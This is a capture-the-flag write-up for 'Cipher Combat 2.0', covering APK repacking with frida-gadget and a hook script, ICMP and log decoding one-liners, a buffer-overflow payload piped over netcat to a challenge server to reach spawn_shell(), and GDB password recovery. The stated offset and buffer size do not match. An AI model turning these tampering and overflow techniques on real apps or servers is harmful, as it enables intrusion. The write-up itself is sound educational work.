# Cipher Combat 2.0

Didn't manage to do much of the first run, because of timezone differences and forgetting that the CTF was ongoing, I managed to performed much better this time round. Hints could be way better (The free hints felt more useful than some 30-point hints), but I appreciate the sentiments of the admins and mods to get participants to try harder before releasing hints. You don't learn through spoonfeeding, you do through questioning assumptions, being resourceful (aka Googling), and learning more about the underlying protocol or binary. Nonetheless, here are my solutions:

## Category: Android Pentesting

### Name: Native or Naive

Artifact is an APK file for an app that decrypts the flag when pressing a button. However they do that in the background, not revealing it easily. A simple frida hook on the `Final_flag()` function of the `MainActivity` class will easily intercept and reveal the flag. As I don't have a spare rooted Android phone at the time of the CTF, I had to repack the APK with frida-gadget before installing it. Commands are:

```bash
$ apktool if Native-or-Naive.apk
$ apktool d -o Native-or-Naive Native-or-Naive.apk
$ cp libfrida-gadget.so Native-or-Naive/lib/arm64-v8a/libfrida-gadget.so
$ vi Native-or-Naive/smali/MainActivity.smali
$ vi Native-or-Naive/AndroidManifest.xml
```

Injected a System.LoadLibrary("frida-gadget") call into the bytecode of the app with:

```smali
const-string v0, "frida-gadget"
invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
```

Added the INTERNET permission in the manifest file:

```xml
<uses-permission android:name="android.permission.INTERNET" />
```

Now I need to repack it:

```bash
$ apktool b -o Native-or-Naive.frida.apk Native-or-Naive

# Create a Keystore
$ keytool -genkey -v -keystore custom.keystore -alias mykeyaliasname -keyalg RSA -keysize 2048 -validity 10000

# Sign the APK
$ jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore custom.keystore -storepass <PASSWORD> Native-or-Naive.frida.apk mykeyaliasname

# Verify that the APK is signed correctly
$ jarsigner -verify Native-or-Naive.frida.apk

# zipalign the APK
$ zipalign 4 Native-or-Naive.frida.apk Native-or-Naive.final.apk

# Run frida in Gadget mode
$ frida -U Gadget
```

Afterwards, it's just a matter of launching the app and connecting to a frida instance for dynamic instrumentation. Here is the script used to hook onto the `Final_flag()` function:

```js
Java.perform(function() {
	var MainActivity = Java.use('com.example.native_or_naive.MainActivity')
	MainActivity.Final_flag.implementation = function() {
		var result = MainActivity.Final_flag.call(this)
		console.log(result)
		return result
	}
})
```

Flag: HE{Not_always_apk_Serctes_Are_in_java_files_or_maybe_they_are}

## Category: Cryptography

### spaces

Fairly straightforward challenge. After base64 decoding, you see a binary sequence of `space` and `notSpace`, kind of like `0` and `1` that computers understand. Afterwards, it's just a matter of wrangling it until you get the flag.

Here is the CyberChef Recipe:

```js
From_Base64('A-Za-z0-9+/=',true)
Find_/_Replace({'option':'Regex','string':'space'},'0',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'notSpace'},'1',true,false,true,false)
Fork('\\n','\\n',false)
From_Base(2)
Find_/_Replace({'option':'Regex','string':'^1$'},'',true,false,true,false)
From_Charcode('Space',10)
Merge()
Remove_whitespace(true,true,true,true,true,false)
```

Flag: HE{april-f001s-d4y!!!}

## Category: Network Security

### EyeSeeeeeAmPeeeeeee

The challenge name reveals a very HUGE hint: we should look at ICMP traffic in the PCAP file. Similar to the `spaces` challenge, there is a binary sequence of PING request and replies. You know the drill.

```bash
$ tshark -r "test.pcapng" -Y "icmp" -T fields -e icmp.type | tr -d '[:space:]' | sed 's/8/1/g' | sed 's/\([01]\{8\}\)/\1 /g'
```

This will produce an output of `01001000 01000101 01111011 01010100 01110010 01111001 01101001 01101110 01100111 01011111 01110100 01101111 01011111 01000111 01100101 01110100 01011111 01001001 01000011 01001101 01010000 01011111 01101000 01110101 01101000 01111101 ` to which you can then convert back to ASCII.

Flag: HE{Trying_to_Get_ICMP_huh}

### Tiny Whiny Log Files

The flag is the combination of all the "Init: User: " lines joined together.

```bash
$ grep "Init: User: " logs.txt | cut -d' ' -f4 | xargs | tr -d '[:space:]'
```

Flag: HE{Im_way_to_lazy_to_solve}

## Category: PWN

### El Clasico of Pwning

A simple buffer overflow attack. Using GDB-Peda's `pattern create` and `pattern search`, we can get a segfault on `0x401195 <stack+51>: ret` instruction. Since what `ret` does is simply `pop rip; jmp rip`, we can find the offset to override the top of the stack, which is at offset `1352` with a buffer size of about `148` bytes.

All we need to do now is to make it jump to `spawn_shell()`, which is located at `0x401196`. Also, since we're living in the 21st century, let's do it the `python3` way instead of `python2`.

```bash
$ (python3 -c "import sys;sys.stdout.buffer.write(b'\x00' * 1352 + b'\x96\x11\x40\x00' + b'\n')"; cat -) | nc 18.136.123.24 8560
```

Flag: HE{Simple_BUffer_Overflow_attack}

## Category: Reversing

### locked

Using `strings`, we can see the password blatantly revealed in plaintext: `v3ry-str0ng-p4ss`.

Flag: HE{l0ck-h4s-b33n-unl0cked}

### Digest

Similar to `locked`, except this time the password is stored as a MD5 hash. Nonetheless, it's easy once you figure out the trick. Using GDB, set a breakpoint before the `strncmp()` function is executed, then view the stack with `x/4xw $rcx` and you'll get `0xc867a153      0x4f96dcd4      0xdd38787d      0x37d1e24c`. Since a MD5 hash is 32 bytes long, just simply fix the endianness to get `53a167c8d4dc964f7d7838dd4ce2d137` which is the hash of `iamalmighty9`.

Flag: HE{iamalmighty9}

### shifter2

Still not very strong at deciphering call graphs, but a hint from the previous Cipher Combat CTF helped in getting the answer. It's a dynamic bit-shifting challenge.

```python
enc = 'qeean,jVhZhhd_c'
flag = ''
for i in range(0xf):
    flag += chr(ord(enc[i]) + i + 2)
print(flag)
```

Flag: HE{shift3r_returns}